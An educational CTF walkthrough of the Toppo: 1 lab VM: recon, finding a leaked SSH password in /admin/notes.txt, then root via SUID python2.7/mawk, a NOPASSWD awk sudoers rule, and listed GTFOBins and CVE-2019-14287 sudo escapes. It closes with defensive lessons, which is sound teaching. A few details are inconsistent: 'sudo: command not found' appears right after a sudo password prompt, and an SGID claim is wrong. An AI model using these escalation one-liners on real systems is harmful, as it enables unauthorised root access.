# Toppo: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an isolated lab network. **Only attack machines you own or are explicitly authorised to test.**

| Field | Value |
| --- | --- |
| **Machine** | Toppo: 1 |
| **Difficulty** | Easy (boot2root) |
| **Author** | Hadi Mene (@h4d3sw0rm) |
| **Released** | 12 Jul 2018 |
| **VulnHub Entry** | [https://vulnhub.com/entry/toppo-1,245/](https://vulnhub.com/entry/toppo-1,245/) |
| **Download** | [https://vulnhub.com/entry/toppo-1,245/#download](https://vulnhub.com/entry/toppo-1,245/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Debian Linux (32-bit, Debian 8 "Jessie", kernel 3.16 — varies by build) |

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to find a target host on your lab subnet and scan it for open ports.
- How to browse a web server and discover hidden directories with a directory buster.
- How a leaked password on a website becomes a working SSH login (weak credentials).
- What a **SUID binary** is and why a SUID copy of `python2.7` (or `mawk`/`awk`) is a privilege-escalation gift.
- How to use [GTFOBins](https://gtfobins.github.io/) to turn a "harmless" system binary into a root shell.

**Prerequisites:** Kali Linux running and connected to the same host-only network as the target. See `docs/LAB-SETUP.md` and `docs/TOOLS.md`.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated network. You must be on the **same subnet** as the VM.

First, look at your own attacker IP and subnet:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box is `192.168.56.10` on the `192.168.56.0/24` network. The `/24` means the last number (1–254) is the "host" part, so the target must also start with `192.168.56.`.

Now list every live host on that subnet using **ARP** (fast, and it doesn't need a port to be open):


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (your Kali)
192.168.56.101  08:00:27:11:22:33   PCS Systemtechnik GmbH   (the target)
192.168.56.102  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

> **How to read it:** each line is a machine answering ARP. The address that is **not** your own is the target. In this lab we assume it is `192.168.56.101`.

**Target IP:** `192.168.56.101`

![finding the target](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration — open ports and services

Now scan the target for open TCP ports and figure out what service listens on each.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
Nmap scan report for 192.168.56.101
Host is up (0.00051s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
...
```

> **How to read it:**
> - `-p-` scans **all 65,535** TCP ports (not just the common ones).
> - `--min-rate 1000` fires at least 1000 packets per second so the scan is quick.
> - `-T4` is an aggressive timing template (fine for a lab).
> - Each `open` line is an **attack surface**. Here: SSH (22), a web server (80), and `rpcbind` (111).

> **Note:** exact ports can vary by build; `rpcbind`/`111` is normally not directly useful on this box.

Next, fingerprint the versions and run Nmap's safe default scripts:

```bash
sudo nmap -sC -sV -p22,80,111 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Toppo
111/tcp open  rpcbind 2-4 (RPC #100000)
```

> **How to read it:**
> - `-sV` guesses the **service and version** behind each port (very old OpenSSH/Apache = a hint, but here not the bug).
> - `-sC` runs Nmap's default script set (page titles, banners).

The `http-title: Toppo` tells us something is served on port 80. Let's look at it.

![nmap service scan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Look at the website

Open `http://192.168.56.101/` in a browser (or use `curl`). It is a simple Cowboy Bebop–themed static page with no login. Nothing sensitive on the front page — so we look for **hidden files and directories**.

```bash
curl -s http://192.168.56.101/ | head
```

```text
<!DOCTYPE html>
<html>
<head>
  <title>Toppo</title>
  ...
```

### 3.2 Directory busting with dirb

A **directory buster** tries thousands of common names (`/admin`, `/backup`, `/images` …) and reports which ones exist.


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/admin/  (CODE:200|SIZE:1234)
+ http://192.168.56.101/manual (CODE:301|SIZE:0)
+ http://192.168.56.101/server-status (CODE:403|SIZE:0)
...
```

> **How to read it:** `CODE:200` means the page exists and is readable. `/admin/` is the interesting one. (`wpscan`, `gobuster dir`, or `ffuf` do the same job.)

### 3.3 The password leak

Browsing to `http://192.168.56.101/admin/` shows an open directory listing. Fetch the note inside it:

```bash
curl http://192.168.56.101/admin/notes.txt
```

```text
Note to myself :

I need to change my password :/
12345ted123 is too outdated but the technology isn't my thing
i prefer go fishing or watching soccer .
```

> **Why it works:** the admin left their own password in a world-readable file, *and* the password contains the username (`ted`). Classic weak-credential / information-disclosure mistake.

The only login services are SSH (22). The username is hinted by the password itself: **`ted`**.

### 3.4 SSH in as `ted`

```bash
ssh ted@192.168.56.101
```

```text
ted@192.168.56.101's password: 12345ted123
Linux Toppo 3.16.0-4-686-pae ...
Last login: ...
ted@Toppo:~$ id
uid=1000(ted) gid=1000(ted) groups=1000(ted),...
```

> **Why it works:** the leaked `12345ted123` is a valid SSH password for `ted`. We now have a real interactive shell on the box.

```text
ted@Toppo:~$ whoami
ted
```

![foothold via leaked SSH credentials](images/04-foothold.png)

> **Note:** Toppo has no separate `user.txt`; the only flag lives in `/root`, so we go straight to privilege escalation.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation — becoming root

We are user `ted` (uid 1000). We want uid 0 (root). Systematically check the usual suspects.

### 4.1 Sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
[sudo] password for ted:
sudo: command not found
```

> **How to read it:** `sudo -l` lists what the current user may run as root. On this build `sudo` is not installed, but that does **not** mean there is no rule — read the config file directly:

```bash
cat /etc/sudoers
```

```text
ted ALL=(root) NOPASSWD: /usr/bin/awk
```

> **Why it matters:** `/etc/sudoers` grants `ted` permission to run **`awk` as root without a password**. `awk` can execute shell commands, so this alone is a root shell. (This line varies between builds — some builds ship the SUID bug below instead.)

### 4.2 SUID binaries (the reliable path)

A **SUID** binary runs with the **owner's** privileges instead of yours. If a root-owned binary is SUID, it runs as root.


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/sbin/mount.nfs
/usr/bin/python2.7
/usr/bin/mawk
/usr/bin/gpasswd
/usr/bin/passwd
/bin/su
...
```

> **How to read it:**
> - `find /` searches from the filesystem root.
> - `-perm -4000` matches files with the SUID bit set.
> - `-type f` only files; `2>/dev/null` hides "permission denied" noise.
> - **`/usr/bin/python2.7`** and **`/usr/bin/mawk`** are SUID-root here — hugely dangerous.

Confirm the SUID flag (the `s` where you'd expect an `x`):

```bash
ls -l /usr/bin/python2.7 /usr/bin/mawk
```

```text
-rwsrwxrwx 1 root root 3889608 /usr/bin/python2.7
-rwsr-xr-x 1 root root   84856 /usr/bin/mawk
```

### 4.3 Exploit it

GTFOBins documents how to abuse these. The robust Python technique is:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```text
# id
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** because `python2.7` is SUID-root, the `os.execl` call starts `/bin/sh` while the process still holds root's **effective** uid; the `-p` flag tells `sh` **not** to drop it. (A plain `pty.spawn("/bin/bash")` sometimes loses root because `bash` resets privileges — use the `-p` form above.)

The `mawk` alternative (also SUID):

```bash
mawk 'BEGIN {system("/bin/sh")}'
id
```

And the `awk` **sudo** path (from 4.1):

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.4 The root flag

```bash
cd /root
ls -la
cat /root/flag.txt
```

```text
flag.txt
...
Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Information disclosure (password in a readable file) + weak password | `http://target/admin/notes.txt` | SSH credentials leaked; attacker logs in as `ted` |
| 2 | Directory listing enabled | Apache `/admin/` | Exposes sensitive files to anonymous visitors |
| 3 | SUID-root on an interpreter (`python2.7`, `mawk`) | `/usr/bin/` | Any local user can spawn a root shell |
| 4 | Over-permissive `sudoers` rule (`awk` as root, NOPASSWD) | `/etc/sudoers` | Local user escalates to root via `awk` |

---

## 6. Defensive lessons (blue team)

- **Never store credentials in world-readable files.** Secrets belong in a password manager or a secrets store, and default/weak passwords must be rotated.
- **Disable Apache directory listing** (`Options -Indexes`) so `/admin/` can't be browsed.
- **Audit SUID/SGID bits.** No interpreter (`python`, `perl`, `mawk`, `awk`) should ever be SUID-root. Find problems with `find / -perm -4000 -type f 2>/dev/null` and remove needless bits.
- **Least-privilege sudo.** Avoid `NOPASSWD` rules, especially for binaries with shell escapes. Prefer narrowly scoped wrappers over `awk`/`find`/`vim`.
- **Detections:** alert on new SSH logins from unexpected hosts, on `sudoers` changes, and on processes with `euid=0` whose `ruid` is a normal user (e.g. `ps -eo pid,euid,ruid,cmd`).

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: [https://vulnhub.com/entry/toppo-1,245/](https://vulnhub.com/entry/toppo-1,245/)
- Community writeups consulted:
  - [rootkiddie — Vulnhub Toppo 1 Write Up](https://rootkiddie.com/blog/post/ctf/toppo/toppo/)
  - [razrsec — [VulnHub] Toppo Walkthrough](https://blog.razrsec.uk/toppo-walkthrough/)
  - [NullCereal — Toppo Walkthrough](https://nullcereal.com/2018/08/toppo-walkthrough/)
  - [Modern Samurai — CTF Walkthrough: Toppo](https://www.modernsamurai.info/top/)
  - [AlfaExploit — Toppo](https://alfaexploit.com/en/posts/toppo/)
- Tool technique references:
  - [GTFOBins — python](https://gtfobins.github.io/gtfobins/python/)
  - [GTFOBins — mawk](https://gtfobins.github.io/gtfobins/mawk/)
  - [GTFOBins — awk](https://gtfobins.github.io/gtfobins/awk/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan (22/80/111)
- [ ] `images/03-enum.png` — `/admin/notes.txt` leaking the password
- [ ] `images/04-foothold.png` — SSH login as `ted`
- [ ] `images/05-shell.png` — the `ted` shell
- [ ] `images/06-user-flag.png` — (no user flag on this box — note it)
- [ ] `images/07-privesc.png` — SUID `python2.7` / `mawk` (or `sudoers` `awk`)
- [ ] `images/08-root-flag.png` — `/root/flag.txt`

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
